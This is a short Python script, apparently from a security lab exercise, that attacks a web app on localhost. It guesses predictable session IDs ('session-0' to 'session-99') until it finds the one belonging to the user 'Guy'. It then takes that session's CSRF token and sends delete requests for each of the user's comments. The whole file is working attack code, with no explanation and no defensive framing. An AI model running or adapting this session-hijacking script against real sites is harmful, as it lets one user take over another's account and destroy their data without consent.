import requests
import re

address = 'http://127.0.0.1:8000/'
target_address = 'http://127.0.0.1:8000/delete/'
target_user = 'Guy'
for i in range(0, 100):
    sid = f'session-{i}'
    session = requests.Session()
    session.cookies.set('sessionid', sid)
    response = session.get(address)
    if 'Username</b>:' in response.text:
        user = re.search(r'Username</b>:\s*([^<]*)', response.text)
        user = user.group(1).strip()
        if user == target_user:
            csrf_token = session.cookies.get('csrftoken')
            headers = {'X-CSRFToken': csrf_token, 'Referer': address}
            comment_ids = re.findall(r'name="id"\s*value="(\d+)', response.text)
            for c_id in comment_ids:
                data = {'id': c_id}
                session.post(target_address, data=data, headers=headers)
            break
